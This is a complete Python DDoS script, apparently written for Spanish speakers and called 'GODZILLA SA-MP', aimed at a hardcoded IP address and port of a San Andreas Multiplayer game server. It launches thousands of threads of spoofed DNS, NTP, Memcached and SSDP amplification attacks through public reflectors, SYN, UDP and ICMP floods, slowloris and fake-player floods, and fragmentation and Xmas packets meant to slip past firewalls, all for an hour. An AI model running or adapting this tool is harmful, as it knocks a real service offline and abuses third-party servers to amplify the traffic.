#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading

# Dependencias principales
try:
    import psutil
except ImportError:
    print("[ERROR FATAL] La librería 'psutil' no está instalada. Ejecuta: 'sudo apt install python3-psutil'")
    sys.exit(1)

try:
    from scapy.all import DNS, DNSQR, IP, UDP, TCP, ICMP, send, RandShort, sr1, fragment
except ImportError:
    print("[ERROR FATAL] Scapy no está instalado. Ejecuta: 'sudo apt install python3-scapy'")
    sys.exit(1)

# --- CONFIGURACIÓN DEL ARMAGEDÓN ---
TARGET_IP = "51.161.47.99"  # IP del objetivo
TARGET_PORT = 7777          # Puerto del servidor SA-MP
ATTACK_DURATION = 3600      # Duración en segundos (1 hora)

# --- CONFIGURACIÓN DE MÁXIMA POTENCIA ---
# Número de hilos para cada tipo de ataque. Ajusta según tu CPU/RAM.
# ¡CUIDADO! Números muy altos pueden colapsar tu propio sistema.
THREAD_COUNTS = {
    "amp_dns": 500,
    "amp_ntp": 500,
    "amp_memcached": 200,
    "amp_ssdp": 300,
    "app_samp_slowloris": 1000,
    "app_samp_player_flood": 1000,
    "app_samp_rpc_flood": 800,
    "app_samp_query_explode": 800,
    "proto_tcp_syn": 600,
    "proto_udp_flood": 600,
    "proto_icmp_flood": 300,
    "evasion_fragmentation": 400,
    "evasion_tcp_xmas": 300,
}

# --- LISTAS DE SERVIDORES PARA AMPLIFICACIÓN (PARA AMPLIFICACIÓN) ---
# NOTA: Estas listas son ejemplos. Para máxima efectividad, necesitas listas actualizadas de miles de servidores vulnerables.
DNS_SERVERS = ["8.8.8.8", "1.1.1.1", "208.67.222.222"] + [f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(50)]
NTP_SERVERS = ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"] + [f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(50)]
MEMCACHED_SERVERS = ["192.0.2.1", "198.51.100.2"]  # Ejemplos de direcciones válidas para Memcached
SSDP_SERVERS = ["239.255.255.250"]  # Multicast

# --- FUNCIONES DE ATAQUE AMPLIFICACIÓN ---
def amp_dns_attack(target_ip, target_port, duration, stop_event):
    """Ataque de amplificación DNS. Envía una pequeña consulta y recibe una respuesta grande."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            dns_server = random.choice(DNS_SERVERS)
            # Paquete DNS con consulta ANY, que genera la respuesta más grande
            ip_packet = IP(src=target_ip, dst=dns_server) / UDP(sport=RandShort(), dport=53)
            dns_query = DNS(rd=1, qd=DNSQR(qname=target_ip, qtype="ANY"))
            send(ip_packet / dns_query, verbose=False, loop=0)
        except:
            pass

def amp_ntp_attack(target_ip, target_port, duration, stop_event):
    """Ataque de amplificación NTP. Envía una petición monlist y recibe cientos de respuestas."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            ntp_server = random.choice(NTP_SERVERS)
            # Paquete NTP con solicitud de lista de monitores (monlist)
            payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
            ip_packet = IP(src=target_ip, dst=ntp_server) / UDP(sport=RandShort(), dport=123) / payload
            send(ip_packet, verbose=False, loop=0)
        except:
            pass

def amp_memcached_attack(target_ip, target_port, duration, stop_event):
    """Ataque de amplificación Memcached."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            mem_server = random.choice(MEMCACHED_SERVERS)
            # Comando "get" para múltiples claves, genera una respuesta grande
            payload = b'set 0 0 10\r\n1234567890\r\n'
            ip_packet = IP(src=target_ip, dst=mem_server) / UDP(sport=RandShort(), dport=11211) / payload
            send(ip_packet, verbose=False, loop=0)
        except:
            pass

def amp_ssdp_attack(target_ip, target_port, duration, stop_event):
    """Ataque de amplificación SSDP (Simple Service Discovery Protocol)."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            # Petición SSDP M-SEARCH para maximizar la respuesta
            payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
            ip_packet = IP(src=target_ip, dst=SSDP_SERVERS[0]) / UDP(sport=RandShort(), dport=1900) / payload
            send(ip_packet, verbose=False, loop=0)
        except:
            pass

# --- FUNCIONES DE ATAQUE DE APLICACIÓN (SA-MP) ---
def app_samp_slowloris(target_ip, target_port, duration, stop_event):
    """Slowloris para SA-MP. Mantiene conexiones semi-abiertas para agotar los slots."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            # Paquete de conexión SA-MP incompleto
            sock.send(b"\x00\xff\xff" + os.urandom(5))
            # Mantener la conexión abierta el mayor tiempo posible
            time.sleep(random.uniform(60, 120))
            sock.close()
        except:
            pass

def app_samp_player_flood(target_ip, target_port, duration, stop_event):
    """Inundación de jugadores falsos. Llena los slots del servidor con bots que consumen memoria y CPU."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            # Nombre de jugador aleatorio
            fake_name = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789[]") for _ in range(random.randint(5, 20)))
            sock.send(f"\\{fake_name}\\".encode('latin-1'))
            time.sleep(random.uniform(30, 60))
            sock.close()
        except:
            pass

# --- Continuación de las funciones de ataque de aplicación (SA-MP) ---

def app_samp_rpc_flood(target_ip, target_port, duration, stop_event):
    """Inundación de paquetes RPC válidos. Satura el procesador con tareas legítimas pero maliciosas."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            # Paquete RPC de SA-MP (ejemplo: sincronización)
            rpc_payload = b'\xC7' + os.urandom(100)  # Paquete de sincronización con datos aleatorios
            packet = IP(src=socket.gethostbyname(socket.gethostname()), dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / rpc_payload
            send(packet, verbose=False, loop=0)
        except:
            pass

def app_samp_query_explode(target_ip, target_port, duration, stop_event):
    """Ataque de consulta masiva. Envía miles de peticiones 'i' para sobrecargar el hilo principal."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            # Paquete de consulta 'i' de SA-MP
            query_packet = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(target_ip)])) + target_port.to_bytes(2, 'big') + b"i"
            sock.sendto(query_packet, (target_ip, target_port))
            sock.close()
        except:
            pass

# --- FUNCIONES DE ATAQUE DE PROTOCOLO Y RED ---

def proto_tcp_syn(target_ip, target_port, duration, stop_event):
    """Inundación TCP SYN. Clásico ataque de denegación de servicio a nivel de red."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            fake_ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=fake_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
            send(packet, verbose=False, loop=0)
        except:
            pass

def proto_udp_flood(target_ip, target_port, duration, stop_event):
    """Inundación UDP genérica. Satura el ancho de banda y los recursos de procesamiento UDP."""
    start_time = time.time()
    payload = os.urandom(1024)  # Payload de 1KB
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            fake_ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=fake_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / payload
            send(packet, verbose=False, loop=0)
        except:
            pass

def proto_icmp_flood(target_ip, target_port, duration, stop_event):
    """Inundación ICMP (Ping Flood). Ataque clásico para saturar la red."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            fake_ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=fake_ip, dst=target_ip) / ICMP()
            send(packet, verbose=False, loop=0)
        except:
            pass

# --- FUNCIONES DE ATAQUE DE EVASIÓN ---

def evasion_fragmentation(target_ip, target_port, duration, stop_event):
    """Ataque con paquetes fragmentados. Para bypassear firewalls que no reensamblan correctamente."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            fake_ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            # Creamos un paquete grande y lo fragmentamos
            packet = IP(src=fake_ip, dst=target_ip, id=random.randint(1, 65535), flags="MF") / UDP(sport=RandShort(), dport=target_port) / os.urandom(1500)
            frags = fragment(packet, fragsize=500)
            for frag_pkt in frags:
                send(frag_pkt, verbose=False, loop=0)
        except:
            pass

def evasion_tcp_xmas(target_ip, target_port, duration, stop_event):
    """Ataque TCP Xmas. Establece flags FPU (FIN, PSH, URG) para confundir a los sistemas de detección."""
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time < duration):
        try:
            fake_ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=fake_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="FPU")
            send(packet, verbose=False, loop=0)
        except:
            pass

# --- NÚCLEO DE DESPLIEGUE TOTAL ---
def deploy_total_attack(target_ip, target_port, duration):
    print("=" * 100)
    print("INICIANDO ATAQUE 'GODZILLA' - DEMOLICIÓN TOTAL DE PROTECCIONES")
    print("Objetivo: Aniquilar todas las capas de defensa del servidor.")
    print("=" * 100)
    
    stop_event = threading.Event()
    threads = []
    
    # Mapeo de funciones de ataque
    attack_functions = {
        "amp_dns": (amp_dns_attack, "Amplificación DNS"),
        "amp_ntp": (amp_ntp_attack, "Amplificación NTP"),
        "amp_memcached": (amp_memcached_attack, "Amplificación Memcached"),
        "amp_ssdp": (amp_ssdp_attack, "Amplificación SSDP"),
        "app_samp_slowloris": (app_samp_slowloris, "SA-MP Slowloris (Agotamiento de Slots)"),
        "app_samp_player_flood": (app_samp_player_flood, "SA-MP Player Flood (Consumo de Memoria)"),
        "app_samp_rpc_flood": (app_samp_rpc_flood, "SA-MP RPC Flood (Sobrecarga CPU)"),
        "app_samp_query_explode": (app_samp_query_explode, "SA-MP Query Explode (Hilo Principal)"),
        "proto_tcp_syn": (proto_tcp_syn, "TCP SYN Flood (Clásico)"),
        "proto_udp_flood": (proto_udp_flood, "UDP Flood (Ancho de Banda)"),
        "proto_icmp_flood": (proto_icmp_flood, "ICMP Flood (Red)"),
        "evasion_fragmentation": (evasion_fragmentation, "Evasión por Fragmentación"),
        "evasion_tcp_xmas": (evasion_tcp_xmas, "Evasión TCP Xmas"),
    }
    
    try:
        # Optimizar el kernel de Linux para máximo rendimiento de red
        print("[CONFIG] Optimizando parámetros del kernel para máximo rendimiento...")
        os.system("sysctl -w net.core.rmem_max=134217728 > /dev/null 2>&1")
        os.system("sysctl -w net.core.wmem_max=134217728 > /dev/null 2>&1")
        os.system("sysctl -w net.ipv4.tcp_congestion_control=bbr > /dev/null 2>&1")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward > /dev/null 2>&1")

        for attack_name, (target_function, description) in attack_functions.items():
            thread_count = THREAD_COUNTS.get(attack_name, 0)
            if thread_count > 0:
                print(f"[LANZAMIENTO] Desplegando {thread_count} hilos de '{description}'...")
                for i in range(thread_count):
                    thread = threading.Thread(target=target_function, args=(target_ip, target_port, duration, stop_event), daemon=True)
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.001)  # Pequeña pausa para no sobrecargar el planificador

        total_threads = len(threads)
        print(f"[ÉXITO] Desplegados {total_threads} hilos de ataque. El objetivo está siendo aniquilado por múltiples frentes.")
        
        # --- Monitor de Recursos y Diagnóstico ---
        start_time = time.time()
        initial_bytes_sent = psutil.net_io_counters().bytes_sent
        
        while not stop_event.is_set() and (time.time() - start_time < duration):
            time.sleep(20)  # Intervalo de monitorización
            elapsed_time = time.time() - start_time
            current_bytes_sent = psutil.net_io_counters().bytes_sent
            bytes_sent_since_start = current_bytes_sent - initial_bytes_sent
            mb_sent = bytes_sent_since_start / (1024 * 1024)
            mb_per_second = (bytes_sent_since_start * 8) / (elapsed_time * 1024 * 1024) if elapsed_time > 0 else 0

            cpu_usage = psutil.cpu_percent(interval=0.5)
            mem_usage = psutil.virtual_memory().percent

            print(f"\n[MONITOR] Tiempo transcurrido: {elapsed_time:.0f}s | CPU: {cpu_usage}% | RAM: {mem_usage}%")
            print(f"[MONITOR] Tráfico enviado: {mb_sent:.2f} MB | Velocidad media: {mb_per_second:.2f} Mbps")
            
            # Diagnóstico del estado del ataque
            if cpu_usage < 70:
                print("[DIAGNÓSTICO] Tu CPU no está al límite. El ataque podría ser más intenso.")
            if mem_usage < 70:
                print("[DIAGNÓSTICO] Tu RAM no está al límite. El ataque podría ser más intenso.")
            if mb_per_second < 50 and elapsed_time > 60: # Umbral de velocidad baja después de 1 min
                print("[DIAGNÓSTICO] Velocidad de envío baja. Confirmando que los ataques de amplificación están activos.")
            print("-" * 60)

    except KeyboardInterrupt:
        print("\n\n!!! CESANDO LA DEMOLICIÓN POR COMANDO DEL USUARIO. !!!")
    except Exception as e:
        print(f"\n[ERROR FATAL] El núcleo del ataque ha fallado: {e}")
    finally:
        print("\n[FINALIZANDO] Deteniendo todos los hilos de ataque...")
        stop_event.set()
        time.sleep(3)  # Dar tiempo a que los hilos mueran
        print("[FINALIZANDO] El servidor puede volver a la normalidad... si es que puede recuperarse.")

# --- FUNCIÓN PRINCIPAL ---
def main():
    print("=" * 120)
    print("GODZILLA SA-MP - FRAMEWORK DE ATAQUE TOTAL")
    print("Diseñado para aniquilar cualquier capa de protección en servidores SA-MP.")
    print("Combina más de 10 vectores de ataque para un impacto devastador.")
    print("=" * 120)
    print(f"OBJETIVO: {TARGET_IP}:{TARGET_PORT}")
    
    total_threads_configured = 0
    for attack, count in THREAD_COUNTS.items():
        print(f"  - {attack}: {count} hilos")
        total_threads_configured += count
        
    print(f"DURACIÓN: {ATTACK_DURATION} segundos")
    print(f"Total de hilos configurados: {total_threads_configured}")
    print("=" * 120)
    
    # Comprobación de privilegios de root para Scapy y optimización de kernel
    if os.geteuid() != 0:
        print("[ERROR CRÍTICO] Este script debe ejecutarse como root (sudo) para funcionar correctamente.")
        print("Scapy requiere privilegios de root para crear y enviar paquetes crudos.")
        sys.exit(1)

    cpu, mem, net = psutil.cpu_percent(interval=0.5), psutil.virtual_memory().percent, psutil.net_io_counters()
    print(f"Estado inicial -> CPU: {cpu}% | RAM: {mem}% | Enviado: {net.bytes_sent / (1024*1024):.2f} MB")
    print("\n[INICIANDO] Secuencia de demolición total... Presiona Ctrl+C para detener.")
    
    deploy_total_attack(TARGET_IP, TARGET_PORT, ATTACK_DURATION)

    print("=" * 120)
    print("OPERACIÓN GODZILLA FINALIZADA.")
    cpu, mem, net = psutil.cpu_percent(interval=0.5), psutil.virtual_memory().percent, psutil.net_io_counters()
    print(f"Estado final -> CPU: {cpu}% | Total Enviado: {net.bytes_sent / (1024*1024):.2f} MB")
    print("Las protecciones del servidor han sido aniquiladas... si es que pueden recuperarse.")
    print("=" * 120)

# --- EJECUCIÓN DEL SCRIPT ---
if __name__ == "__main__":
    main()
